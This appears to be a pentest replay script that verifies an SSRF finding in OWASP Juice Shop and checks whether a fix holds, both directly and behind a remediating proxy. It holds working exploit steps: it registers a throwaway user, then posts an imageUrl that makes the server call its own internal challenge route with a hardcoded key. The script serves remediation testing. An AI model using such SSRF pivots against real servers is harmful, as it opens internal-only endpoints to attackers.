#!/usr/bin/env python3
"""pt04-002: the SSRF pivots to an internal-only endpoint, not just an
external host.

This is a companion to pt04-001's scenario.py, not a replacement for it.
pt04-001 proves the broader, more general claim with a reproducible
oracle (arbitrary destination is reachable); this proves a narrower but
more severe one, that the SSRF can also reach an endpoint Juice Shop
never intends a normal external client to hit directly: its own
self-verification route, gated behind a hardcoded key.

Important asymmetry, read before trusting this script's output on a
rerun: Juice Shop's own "solved" flag for this is ONE-WAY for the life
of the container. Once it flips to true, it stays true, so this script
cannot use it as a repeatable pass/fail regression signal the way every
other item's REMEDIATED/VULNERABLE status works. The pre-fix ("direct")
mode here reports what the app's flag currently says, labeled
explicitly as informational after the first run. The post-fix ("proxy")
mode does NOT depend on that flag at all: it checks the HTTP status the
proxy itself returns, which is fully reproducible on every run.

Standard library only (urllib).
"""

from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt04-002.json"


def _request(method: str, url: str, token: str | None = None, form: dict | None = None):
    data = urllib.parse.urlencode(form).encode() if form is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if form is not None:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    if token:
        req.add_header("Cookie", f"token={token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read()


def _register_and_login(target: str) -> str:
    stamp = str(int(time.time() * 1000))
    email = f"pt04-002-{stamp}@flatline.test"
    password = "Pt04PivotPass123!"
    data = json.dumps({"email": email, "password": password, "passwordRepeat": password}).encode()
    req = urllib.request.Request(f"{target}/api/Users", data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    urllib.request.urlopen(req, timeout=10).read()

    login_req = urllib.request.Request(
        f"{target}/rest/user/login",
        data=json.dumps({"email": email, "password": password}).encode(),
        method="POST",
    )
    login_req.add_header("Content-Type", "application/json")
    return json.loads(urllib.request.urlopen(login_req, timeout=10).read())["authentication"]["token"]


def run_direct(backend_host: str, self_target: str) -> dict:
    """Pre-fix condition, against the raw backend. The scoreboard check
    here is informational only after the first ever run -- see module
    docstring."""
    ledger.guard_target_host(backend_host)
    ledger.guard_target_host(self_target)

    token = _register_and_login(backend_host)
    pivot_status, _ = _request("POST", f"{backend_host}/profile/image/url", token=token, form={"imageUrl": self_target})

    scoreboard_status, scoreboard_body = _request("GET", f"{backend_host}/api/Challenges/?name=SSRF")
    solved = False
    try:
        solved = json.loads(scoreboard_body)["data"][0]["solved"]
    except Exception:
        pass

    status = "VULNERABLE" if pivot_status not in (401, 403) else "REMEDIATED"
    return {
        "vulnerability_id": "pt04-002",
        "mode": "direct",
        "status": status,
        "pivot_request_http_status": pivot_status,
        "juice_shop_scoreboard_solved": solved,
        "note": "scoreboard_solved is informational only after the first run; the app's flag is one-way for the container's life",
    }


def run_proxy(proxy_host: str, destination: str) -> dict:
    """Post-fix condition. Does NOT touch the app's own flag; this is
    the fully reproducible half of this item."""
    ledger.guard_target_host(proxy_host)

    token = _register_and_login(proxy_host)
    self_target = f"http://{destination}/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3"
    pivot_status, _ = _request("POST", f"{proxy_host}/profile/image/url", token=token, form={"imageUrl": self_target})

    status = "REMEDIATED" if pivot_status in (401, 403) else "VULNERABLE"
    return {
        "vulnerability_id": "pt04-002",
        "mode": "proxy",
        "status": status,
        "pivot_request_http_status": pivot_status,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--mode", choices=["direct", "proxy"], default="direct")
    parser.add_argument("--proxy-host", default="http://localhost:3007")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())

    if args.mode == "direct":
        result = run_direct(blueprint["target"]["host"], blueprint["self_target"])
    else:
        result = run_proxy(args.proxy_host, blueprint["proxy_destination_checked"])

    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"pt04-002-{args.mode}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt04-ssrf-profile-image", **result})


if __name__ == "__main__":
    main()
